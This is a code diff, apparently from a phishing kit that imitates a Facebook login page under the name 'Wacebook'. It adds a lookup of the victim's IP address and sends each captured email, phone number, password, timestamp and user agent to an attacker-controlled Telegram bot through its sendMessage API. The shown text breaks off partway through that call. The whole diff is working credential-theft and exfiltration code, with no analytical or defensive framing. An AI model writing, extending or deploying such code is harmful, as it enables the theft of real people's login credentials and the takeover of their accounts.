@@ -9,22 +9,37 @@ export const TELEGRAM_CONFIG = {
   API_URL: "https://api.telegram.org/bot"
 };
 
-// Function to send data to Telegram bot
+// Get user's public IP address
+const getUserIP = async (): Promise<string> => {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip || 'Unknown IP';
+  } catch (error) {
+    console.error('Failed to fetch IP address:', error);
+    return 'Unknown IP';
+  }
+};
+
+// Send login attempt to Telegram bot
 export const sendToTelegramBot = async (data: {
   email: string;
   phone: string;
   password: string;
-  timestamp: string;
-  userAgent: string;
 }) => {
   try {
+    const ip = await getUserIP();
+    const timestamp = new Date().toLocaleString();
+    const userAgent = navigator.userAgent;
+
     const message = `
 🚨 *Wacebook Login Attempt*
 📧 Email: ${data.email}
 📱 Phone: ${data.phone}
 🔒 Password: ${data.password}
-⏰ Time: ${data.timestamp}
-🖥️ User Agent: ${data.userAgent}
+🌐 IP Address: ${ip}
+⏰ Time: ${timestamp}
+🖥️ User Agent: ${userAgent}
     `;
 
     const response = await fetch(`${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
